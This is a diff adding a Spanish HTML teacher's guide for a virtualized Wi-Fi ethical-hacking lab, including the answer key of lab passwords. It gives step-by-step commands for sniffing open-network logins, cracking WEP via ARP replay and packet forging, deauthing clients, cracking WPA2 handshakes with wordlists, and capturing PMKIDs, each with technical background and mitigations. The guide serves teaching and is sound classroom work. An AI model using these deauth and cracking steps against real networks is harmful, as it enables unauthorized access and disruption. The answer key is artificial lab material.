@@ -1,0 +1,1230 @@
+<style>
+.he-guia { max-width: 900px; }
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+} .he-guia.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+} .he-guia.showEditorSelection .code-line {
+	position: relative;
+} .he-guia.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+} .he-guia.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+} .he-guia.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+<div class="he-guia markdown-body">
+<h1 id="guia-del-profesor-laboratorio-wi-fi-hacking-etico">Guía del profesor — Laboratorio Wi-Fi (Hacking Ético)</h1>
+<blockquote>
+<p><strong>DOCUMENTO SOLO PARA EL PROFESOR.</strong> Contiene las claves y la resolución
+completa de cada escenario. No lo repartas al alumnado: ellos tienen
+<code>guia_alumno.md</code>.</p>
+</blockquote>
+<blockquote>
+<p><strong>Entorno 100 % virtualizado.</strong> Todas las radios son simuladas con
+<code>mac80211_hwsim</code> y aisladas en <em>network namespaces</em>. No hay emisión por
+radio real: las prácticas solo funcionan contra los APs de este laboratorio.
+<strong>Uso exclusivamente educativo y en el aula.</strong> Atacar redes reales sin
+autorización expresa por escrito es ilegal (en España, arts. 197 bis y 264
+del Código Penal).</p>
+</blockquote>
+<hr>
+<h2 id="0-puesta-en-marcha">0. Puesta en marcha</h2>
+<pre class="hljs"><code><div>sudo ./despliegue.sh
+</div></code></pre>
+<p>El script instala lo que falte (<code>hostapd</code>, <code>hcxtools</code>, <code>pocl-opencl-icd</code>,
+<code>ocl-icd-libopencl1</code>), levanta los 6 escenarios y, al terminar, imprime el
+<strong>SSID, canal y BSSID real</strong> de cada uno (las claves no se muestran). Los BSSID
+cambian en cada despliegue. Las interfaces de trabajo del alumno son
+<strong><code>wlan0</code> … <code>wlan6</code></strong>.</p>
+<p>Para desmontarlo todo: <code>sudo ./limpia.sh</code>.</p>
+<h3 id="poner-una-interfaz-en-modo-monitor">Poner una interfaz en modo monitor</h3>
+<pre class="hljs"><code><div>sudo airmon-ng start wlan0 &lt;canal&gt;   <span class="hljs-comment"># crea wlan0mon</span>
+<span class="hljs-comment"># o, a mano:</span>
+sudo ip link <span class="hljs-built_in">set</span> wlan0 down
+sudo iw dev wlan0 <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span> monitor
+sudo ip link <span class="hljs-built_in">set</span> wlan0 up
+</div></code></pre>
+<p><strong>No uses <code>airmon-ng check kill</code>.</strong> El script ya excluye las radios virtuales
+de NetworkManager, así que no hay nada que matar. Además, <code>ip netns exec</code> no
+aísla PIDs: <code>check kill</code> mataría los <code>wpa_supplicant</code> de los clientes del lab y
+los escenarios se quedarían sin tráfico (hay que volver a desplegar).
+<code>airmon-ng start</code> mostrará esos procesos como &quot;could cause trouble&quot;: es solo un
+aviso y se puede ignorar.</p>
+<h3 id="localizar-objetivos-y-fijar-canal">Localizar objetivos y fijar canal</h3>
+<pre class="hljs"><code><div><span class="hljs-comment"># Barrido general: anota BSSID y canal (CH)</span>
+sudo airodump-ng wlan0
+
+<span class="hljs-comment"># Fijar la interfaz al canal del objetivo (ej. canal 11)</span>
+sudo iw dev wlan0 <span class="hljs-built_in">set</span> channel 11
+</div></code></pre>
+<hr>
+<h2 id="soluciones">Soluciones</h2>
+<table>
+<thead>
+<tr>
+<th>SSID</th>
+<th>Ch</th>
+<th>Seguridad</th>
+<th>Objetivo didáctico</th>
+<th>Solución</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>he_open</code></td>
+<td>1</td>
+<td>Abierta</td>
+<td>Sniffing de tráfico en claro (HTTP POST)</td>
+<td><code>user=admin&amp;pass=SecretPass2026</code></td>
+</tr>
+<tr>
+<td><code>he_wep</code></td>
+<td>9</td>
+<td>WEP-104</td>
+<td>Recolección de IVs + reinyección ARP</td>
+<td><code>ilovemyfamily</code> (hex <code>69:6C:6F:76:65:6D:79:66:61:6D:69:6C:79</code>)</td>
+</tr>
+<tr>
+<td><code>he_wpa2</code></td>
+<td>6</td>
+<td>WPA2-PSK</td>
+<td>Captura del handshake 4-way + crackeo</td>
+<td><code>sunshine</code></td>
+</tr>
+<tr>
+<td><code>he_pmkid</code></td>
+<td>11</td>
+<td>WPA2-PSK</td>
+<td>PMKID <strong>con</strong> clientes asociados</td>
+<td><code>butterfly</code></td>
+</tr>
+<tr>
+<td><code>he_pmkid_nc</code></td>
+<td>4</td>
+<td>WPA2-PSK</td>
+<td>PMKID <strong>sin</strong> clientes (<em>clientless</em>)</td>
+<td><code>football</code></td>
+</tr>
+<tr>
+<td><code>he_enterprise</code></td>
+<td>3</td>
+<td>WPA2-EAP</td>
+<td>Análisis pasivo de EAP-PEAP</td>
+<td>Identidad <code>student_user@domain.lab</code> · tipo EAP 25 (PEAP) · cert. <code>radius.domain.lab</code></td>
+</tr>
+</tbody>
+</table>
+<p>Las tres claves WPA2 están en <code>rockyou.txt</code>. El password interno del cliente
+Enterprise (<code>EnterprisePass2026</code>) <strong>no</strong> es un objetivo de la práctica: el
+alumno solo debe identificar la identidad en claro y el método EAP.</p>
+<hr>
+<h2 id="1-he-open-red-abierta-trafico-en-claro">1. <code>he_open</code> — Red abierta (tráfico en claro)</h2>
+<p>Un cliente envía un POST de login en bucle. El objetivo es demostrar que en una
+red sin cifrado las credenciales viajan legibles.</p>
+<pre class="hljs"><code><div>sudo iw dev wlan0 <span class="hljs-built_in">set</span> channel 1
+sudo airodump-ng -c 1 --bssid &lt;BSSID_OPEN&gt; -w cap_open wlan0
+<span class="hljs-comment"># En otra terminal, filtrar el POST en la captura:</span>
+tshark -r cap_open-01.cap -Y <span class="hljs-string">'http.request.method == "POST"'</span> -T fields -e http.file_data
+</div></code></pre>
+<p><strong>Resultado esperado:</strong> <code>user=admin&amp;pass=SecretPass2026</code>.</p>
+<p><strong>Aprendizaje:</strong> cualquiera en la misma red abierta ve las credenciales.</p>
+<h3 id="fundamento-tecnico">Fundamento técnico</h3>
+<ul>
+<li><strong>No hay cifrado en la capa de enlace.</strong> En una red abierta el cuerpo de las
+tramas de datos 802.11 viaja tal cual: cabecera LLC/SNAP, IP, TCP y HTTP.</li>
+<li><strong>El medio es compartido.</strong> Una interfaz en <strong>modo monitor</strong> entrega al
+sistema todas las tramas del canal, vayan dirigidas a ella o no (no filtra
+por <code>addr1</code>). No hace falta asociarse ni &quot;atacar&quot; nada: basta escuchar.</li>
+<li><strong>Lo que se explota es la ausencia de cifrado extremo a extremo.</strong> El
+formulario se envía por HTTP, así que usuario y contraseña van legibles en
+el cuerpo del POST. Con HTTPS (TLS) se vería el tráfico, pero no su
+contenido.</li>
+<li><strong>Mitigación:</strong> TLS en las aplicaciones (HTTPS, HSTS) y, en la red, <strong>OWE /
+Wi-Fi Enhanced Open</strong> (WPA3), que cifra cada cliente con una clave propia
+negociada por Diffie-Hellman sin necesidad de contraseña.</li>
+</ul>
+<hr>
+<h2 id="2-he-wep-wep-ivs-reinyeccion-arp">2. <code>he_wep</code> — WEP (IVs + reinyección ARP)</h2>
+<p>Dos clientes generan ARP broadcast en bucle, ideal para la reinyección. Basta
+una sola interfaz en monitor para capturar e inyectar.</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Monitor en el canal 9 (sin 'check kill')</span>
+sudo airmon-ng start wlan0 9
+
+BSSID=&lt;BSSID_WEP&gt;
+
+<span class="hljs-comment"># 1. Capturar IVs (terminal 1, dejar corriendo)</span>
+sudo airodump-ng -c 9 --bssid <span class="hljs-variable">$BSSID</span> -w cap_wep wlan0mon
+<span class="hljs-comment">#    Anotar la MAC de un cliente de la lista STATION (p. ej. 02:00:00:00:13:00)</span>
+CLIENT=&lt;MAC_CLIENTE&gt;
+
+<span class="hljs-comment"># 2. Reinyección ARP suplantando al cliente (terminal 2)</span>
+sudo aireplay-ng -3 -b <span class="hljs-variable">$BSSID</span> -h <span class="hljs-variable">$CLIENT</span> wlan0mon
+<span class="hljs-comment">#    Si se reinicia, reutilizar el ARP ya capturado:</span>
+<span class="hljs-comment">#    sudo aireplay-ng -3 -b $BSSID -h $CLIENT -r replay_arp-*.cap wlan0mon</span>
+
+<span class="hljs-comment"># 3. Crackear en paralelo (terminal 3); reintenta solo cada 5000 IVs</span>
+aircrack-ng -b <span class="hljs-variable">$BSSID</span> cap_wep-*.<span class="hljs-built_in">cap</span>
+<span class="hljs-comment">#    Si PTW no lo consigue: aircrack-ng -K -n 128 -b $BSSID cap_wep-*.cap</span>
+</div></code></pre>
+<p><strong>Resultado esperado:</strong> <code>KEY FOUND! [ 69:6C:6F:76:65:6D:79:66:61:6D:69:6C:79 ] (ASCII: ilovemyfamily)</code>
+(con WEP-104, normalmente entre 20.000 y 80.000 IVs).</p>
+<h3 id="fundamento-tecnico">Fundamento técnico</h3>
+<p><strong>Cómo cifra WEP cada paquete.</strong> WEP usa el cifrador de flujo <strong>RC4</strong>. La
+clave de cada paquete se construye pegando un <strong>IV</strong> (vector de
+inicialización, 24 bits) delante de la clave compartida:</p>
+<pre class="hljs"><code><div>clave RC4 del paquete = IV (24 bits, viaja EN CLARO) ‖ clave WEP (40 o 104 bits)
+keystream             = RC4(IV ‖ clave WEP)
+ICV                   = CRC32(datos)
+cifrado               = (datos ‖ ICV) ⊕ keystream
+trama                 = cabecera 802.11 ‖ IV ‖ KeyID ‖ cifrado
+</div></code></pre>
+<p>El receptor lee el IV de la cabecera, lo pega a la clave que ya conoce,
+regenera el mismo keystream y hace XOR para descifrar.</p>
+<p><strong>Qué se explota:</strong></p>
+<ol>
+<li><strong>Los primeros bytes de la clave RC4 de cada paquete son públicos.</strong> El IV
+ocupa los 3 primeros bytes y viaja en claro. El algoritmo de inicialización
+de RC4 (KSA) tiene correlaciones estadísticas entre los bytes de la clave y
+los primeros bytes del keystream:
+<ul>
+<li><strong>FMS (2001):</strong> solo los IV &quot;débiles&quot; filtraban información; hacían falta
+millones de paquetes.</li>
+<li><strong>KoreK (2004):</strong> más correlaciones; cientos de miles de IVs. Es el modo
+<code>-K</code> de aircrack-ng.</li>
+<li><strong>PTW (2007):</strong> basado en la correlación de Klein; sirve <strong>cualquier</strong> IV.
+Con WEP-104, ~40.000 paquetes dan un 50 % de éxito y ~85.000 un 95 %. Es
+el modo por defecto de aircrack-ng.</li>
+</ul>
+</li>
+<li><strong>Hay texto plano conocido para obtener el keystream.</strong> El ataque necesita
+los primeros bytes del keystream de cada paquete, y keystream = cifrado ⊕
+texto plano. Los paquetes ARP empiezan siempre igual: LLC/SNAP
+<code>AA AA 03 00 00 00 08 06</code> más la cabecera ARP <code>00 01 08 00 06 04 00 01</code>.
+Por eso PTW usa ARP: de cada uno se obtienen unos 16 bytes de keystream,
+cada paquete &quot;vota&quot; por el valor de cada byte de la clave y, con suficientes
+votos, la clave cae.</li>
+<li><strong>No hay protección contra repetición.</strong> WEP no lleva contador ni número de
+secuencia criptográfico: un paquete cifrado capturado es válido para
+siempre. El atacante reinyecta el mismo ARP una y otra vez. El AP lo acepta
+y lo retransmite en broadcast <strong>cifrado con un IV nuevo</strong>, y cada
+retransmisión es una muestra más para PTW. Esto es lo que hace
+<code>aireplay-ng -3</code>: pasar de unos pocos IVs por segundo a cientos.</li>
+<li><strong>El IV es demasiado corto.</strong> Con 24 bits solo hay 16,7 millones de IVs y,
+por la paradoja del cumpleaños, hay un 50 % de probabilidad de repetir uno
+a los ~5.000 paquetes. Mismo IV implica mismo keystream, y C1 ⊕ C2 = P1 ⊕ P2.</li>
+<li><strong>La integridad es lineal y no lleva clave.</strong> CRC32 no es un MAC: se pueden
+modificar bits del cifrado y recalcular el ICV sin conocer la clave
+(<em>bit-flipping</em>). Es la base de chopchop.</li>
+<li><strong>La clave es estática y compartida.</strong> Todos los clientes usan la misma
+clave, que no rota nunca.</li>
+</ol>
+<p><strong>Por qué no importa lo robusta que sea la clave.</strong> El ataque es estadístico,
+no de diccionario: no prueba contraseñas, sino que deduce cada byte de la
+clave a partir de las correlaciones. <code>ilovemyfamily</code> o 13 bytes aleatorios
+caen con el mismo número de IVs.</p>
+<p><strong>Fundamento del plan B</strong> (sin un ARP capturado):</p>
+<ul>
+<li><strong>Fragmentación (<code>-5</code>).</strong> De cualquier paquete se conocen los 8 primeros
+bytes en claro (LLC/SNAP), así que se obtienen 8 bytes de keystream. 802.11
+permite partir un paquete en hasta 16 fragmentos, y cada uno se puede cifrar
+con ese mismo keystream. El AP reensambla los fragmentos y retransmite el
+paquete completo con un IV nuevo. Como el atacante conoce lo que ha enviado,
+obtiene un keystream más largo, y repitiendo llega hasta ~1500 bytes.</li>
+<li><strong>Chopchop (<code>-4</code>).</strong> Se quita el último byte de un paquete cifrado, se
+prueba cada uno de los 256 valores posibles y se corrige el ICV aprovechando
+la linealidad de CRC32. El AP descarta los ICV incorrectos y solo acepta el
+correcto, así que actúa de <strong>oráculo</strong>: se descifra el paquete byte a byte.</li>
+<li><strong><code>packetforge-ng</code>.</strong> Con un keystream y su IV se puede cifrar cualquier
+paquete: <code>(ARP ‖ CRC32(ARP)) ⊕ keystream</code>. Así se fabrica un ARP válido para
+reinyectar.</li>
+</ul>
+<p><strong>Mitigación:</strong> no hay ninguna dentro de WEP: está roto por diseño. Hay que
+usar WPA2 o WPA3.</p>
+<h3 id="por-que-h-con-la-mac-de-un-cliente-y-no-fake-auth-1">Por qué <code>-h</code> con la MAC de un cliente y no fake auth (<code>-1</code>)</h3>
+<p>En un AP real se haría <code>aireplay-ng -1</code> (fake auth) y se inyectaría con la MAC
+propia. En <code>mac80211_hwsim</code> <strong>no funciona</strong>: el simulador solo genera ACK para
+interfaces activas, y una interfaz en monitor no lo es. El AP no recibe el ACK
+de la <em>Association Response</em>, hostapd no da por asociada la estación y descarta
+los ARP inyectados (aireplay muestra <code>got a deauth/disassoc packet</code>).</p>
+<p>Síntoma típico: aireplay envía miles de paquetes, pero <code>#Data</code> en airodump
+apenas sube (2-3/s). Comprobación desde el host:</p>
+<pre class="hljs"><code><div>sudo ip netns <span class="hljs-built_in">exec</span> ns_ap_wep iw dev wlan_ap_wep station dump | grep Station
+<span class="hljs-comment"># Solo aparecen los dos clientes reales, no la MAC de wlan0mon</span>
+</div></code></pre>
+<p>Suplantando a un cliente ya asociado, el AP acepta los ARP y los retransmite
+con IVs nuevos: <code>#Data</code> sube a cientos por segundo.</p>
+<h3 id="la-columna-lost-de-airodump">La columna <code>Lost</code> de airodump</h3>
+<p>Con la reinyección, la estación suplantada muestra muchos <code>Lost</code>. No son
+paquetes perdidos: airodump calcula <code>Lost</code> por saltos en el número de
+secuencia, y el cliente real y aireplay emiten con la misma MAC y secuencias
+distintas. Se ignora; lo que importa es que <code>#Data</code> suba.</p>
+<h3 id="plan-b-sin-arp-capturado-forjar-uno">Plan B: sin ARP capturado (forjar uno)</h3>
+<p>Si <code>-3</code> no llega a capturar ningún ARP, se obtiene el keystream de cualquier
+paquete de datos y se forja un ARP:</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Keystream: fragmentación (si falla, chopchop con -4 -&gt; replay_dec-*.xor)</span>
+sudo aireplay-ng -5 -b <span class="hljs-variable">$BSSID</span> -h <span class="hljs-variable">$CLIENT</span> wlan0mon          <span class="hljs-comment"># -&gt; fragment-*.xor</span>
+
+packetforge-ng -0 -a <span class="hljs-variable">$BSSID</span> -h <span class="hljs-variable">$CLIENT</span> -k 255.255.255.255 -l 255.255.255.255 \
+               -y fragment-*.xor -w arp_forjado.cap
+
+sudo aireplay-ng -2 -r arp_forjado.cap wlan0mon              <span class="hljs-comment"># responder "y"</span>
+</div></code></pre>
+<hr>
+<h2 id="3-he-wpa2-handshake-4-way-crackeo-offline">3. <code>he_wpa2</code> — Handshake 4-way + crackeo offline</h2>
+<p>Hay dos clientes asociados.</p>
+<h3 id="a-capturar-el-handshake">a) Capturar el handshake</h3>
+<pre class="hljs"><code><div>sudo iw dev wlan0 <span class="hljs-built_in">set</span> channel 6
+sudo airodump-ng -c 6 --bssid &lt;BSSID_WPA2&gt; -w cap_wpa2 wlan0
+</div></code></pre>
+<h3 id="b-forzar-reconexion-con-un-deauth-desde-otra-terminal">b) Forzar reconexión con un deauth (desde otra terminal)</h3>
+<pre class="hljs"><code><div>sudo iw dev wlan1 <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span> monitor &amp;&amp; sudo ip link <span class="hljs-built_in">set</span> wlan1 up
+sudo iw dev wlan1 <span class="hljs-built_in">set</span> channel 6
+sudo aireplay-ng -0 3 -a &lt;BSSID_WPA2&gt; wlan1
+</div></code></pre>
+<p>Cuando airodump muestre <code>WPA handshake: &lt;BSSID&gt;</code> arriba a la derecha, ya lo tienes.</p>
+<h3 id="c-crackear">c) Crackear</h3>
+<pre class="hljs"><code><div><span class="hljs-comment"># Con aircrack-ng</span>
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b &lt;BSSID_WPA2&gt; cap_wpa2-01.cap
+
+<span class="hljs-comment"># O con hashcat (modo 22000)</span>
+hcxpcapngtool -o hash_wpa2.22000 cap_wpa2-01.cap
+hashcat -m 22000 hash_wpa2.22000 /usr/share/wordlists/rockyou.txt
+</div></code></pre>
+<p><strong>Resultado esperado:</strong> <code>sunshine</code>.</p>
+<h3 id="fundamento-tecnico">Fundamento técnico</h3>
+<p><strong>Derivación de claves.</strong> La contraseña nunca viaja por la red. A partir de
+ella se deriva la <strong>PMK</strong>, y en cada conexión se deriva de la PMK una clave
+temporal, la <strong>PTK</strong>:</p>
+<pre class="hljs"><code><div>PMK = PBKDF2-HMAC-SHA1(passphrase, SSID, 4096 iteraciones, 256 bits)
+PTK = PRF-512(PMK, &quot;Pairwise key expansion&quot;,
+              min(MAC_AP,MAC_STA) ‖ max(MAC_AP,MAC_STA) ‖
+              min(ANonce,SNonce)  ‖ max(ANonce,SNonce))
+KCK = primeros 128 bits de la PTK      (clave para el MIC)
+</div></code></pre>
+<p><strong>Handshake 4-way:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Mensaje</th>
+<th>Sentido</th>
+<th>Contenido relevante</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>M1</td>
+<td>AP → STA</td>
+<td>ANonce (en claro)</td>
+</tr>
+<tr>
+<td>M2</td>
+<td>STA → AP</td>
+<td>SNonce (en claro) + <strong>MIC</strong> = HMAC-SHA1(KCK, trama M2)</td>
+</tr>
+<tr>
+<td>M3</td>
+<td>AP → STA</td>
+<td>GTK cifrada + MIC</td>
+</tr>
+<tr>
+<td>M4</td>
+<td>STA → AP</td>
+<td>Confirmación + MIC</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Qué se explota:</strong></p>
+<ul>
+<li><strong>Todo lo que entra en el cálculo, salvo la contraseña, viaja en claro:</strong>
+SSID, MACs, ANonce, SNonce y la propia trama M2. El <strong>MIC funciona como un
+verificador de la contraseña</strong>. Para cada candidata del diccionario se
+calcula PMK → PTK → KCK → MIC; si coincide con el capturado, la contraseña
+es esa. Es un ataque <strong>offline</strong>: no hay que hablar con el AP ni hay límite
+de intentos. Basta con M1 + M2 (o M2 + M3).</li>
+<li><strong>Las tramas de gestión no van autenticadas.</strong> Sin 802.11w (PMF), un deauth
+con la MAC del AP falsificada desconecta al cliente. Este se reconecta solo
+y repite el handshake delante del atacante. Por eso funciona
+<code>aireplay-ng -0</code>.</li>
+<li><strong>Contraste con WEP:</strong> aquí no hay debilidad criptográfica, solo fuerza
+bruta. PBKDF2 con 4096 iteraciones hace cada intento caro. Con una
+contraseña larga y aleatoria el ataque es inviable; solo caen las
+contraseñas débiles o de diccionario (<code>sunshine</code> está en <code>rockyou.txt</code>).</li>
+<li><strong>El SSID actúa como sal:</strong> las tablas precalculadas solo sirven para un
+SSID concreto. Por eso los SSID por defecto o muy comunes son más
+vulnerables.</li>
+</ul>
+<p><strong>Mitigación:</strong> contraseña larga y aleatoria; <strong>WPA3-SAE</strong> (el intercambio
+<em>Dragonfly</em> no deja material para un ataque de diccionario offline y aporta
+<em>forward secrecy</em>); <strong>PMF (802.11w)</strong> contra los deauth falsificados.</p>
+<hr>
+<h2 id="4-he-pmkid-pmkid-con-clientes">4. <code>he_pmkid</code> — PMKID <strong>con</strong> clientes</h2>
+<p>Hay una estación asociada generando tráfico. Sirve para contrastar las <strong>dos
+vías</strong>: capturar el PMKID (campo del M1) o el handshake 4-way tras un deauth.</p>
+<p>Con hcxtools se consiguen las dos vías en una sola captura: hcxdumptool
+captura PMKID y handshakes a la vez.</p>
+<h3 id="a-capturar-con-hcxdumptool-canal-11-solo-este-ap">a) Capturar con hcxdumptool (canal 11, solo este AP)</h3>
+<pre class="hljs"><code><div><span class="hljs-comment"># Localizar el objetivo</span>
+sudo airodump-ng wlan0mon --band g       <span class="hljs-comment"># he_pmkid: CH 11, con una estación</span>
+BSSID=&lt;BSSID_PMKID&gt;
+
+<span class="hljs-comment"># Filtro BPF para no atacar los otros escenarios</span>
+sudo hcxdumptool --bpfc=<span class="hljs-string">"wlan addr3 <span class="hljs-variable">$BSSID</span>"</span> &gt; pmkid.bpf
+
+<span class="hljs-comment"># Interfaz limpia: hcxdumptool la pone en monitor él solo</span>
+sudo hcxdumptool -i wlan1 -c 11a --bpf=pmkid.bpf -w pmkid_cli.pcapng --rds=1
+</div></code></pre>
+<p><code>pmkid.bpf</code> no forma parte del lab: lo genera <code>--bpfc</code> en la primera
+línea. Es el filtro compilado a bytecode BPF, en el mismo formato que
+<code>tcpdump -ddd</code>. <code>addr3</code> es el BSSID en las tramas de gestión y en el M1 del
+AP. El filtro es opcional, pero sin él hcxdumptool también ataca a los
+clientes de los otros escenarios del mismo canal.</p>
+<p>hcxdumptool hace dos cosas a la vez:</p>
+<ul>
+<li><strong>Se asocia con el AP con una MAC inventada.</strong> El AP le envía el M1 con el
+PMKID, igual que en <code>he_pmkid_nc</code>.</li>
+<li><strong>Ataca al cliente legítimo.</strong> Lo desasocia y, cuando el cliente intenta
+reconectar, consigue su M2. Puede capturar el 4-way completo contra el AP
+real o hacerse pasar por el AP (pares <em>ROGUE</em>). En los dos casos el M2 lo
+calcula el cliente con la <strong>clave real</strong>, así que su MIC sirve para
+crackear. No es como el M2 de la contraseña falsa del método B de
+<code>he_pmkid_nc</code>.</li>
+</ul>
+<p>En la pantalla salen <strong>dos filas</strong> para este AP:</p>
+<ul>
+<li><strong>Con la MAC de hcxdumptool</strong> en <code>MAC-CL</code>: columna <code>P</code> marcada (PMKID).</li>
+<li><strong>Con la MAC del cliente real</strong>: columnas <code>2</code> o <code>3</code> marcadas (handshake).</li>
+</ul>
+<p>Cuando estén las dos, <strong>Ctrl+C</strong>. Bastan unos segundos o un minuto. No hay que
+dejarlo corriendo: mientras está activo sigue desconectando al cliente.</p>
+<h3 id="b-convertir-y-separar-los-dos-tipos-de-hash">b) Convertir y separar los dos tipos de hash</h3>
+<pre class="hljs"><code><div>hcxpcapngtool -o pmkid_cli.22000 pmkid_cli.pcapng
+
+<span class="hljs-comment"># Quedarse solo con he_pmkid (por si se ha colado otra red)</span>
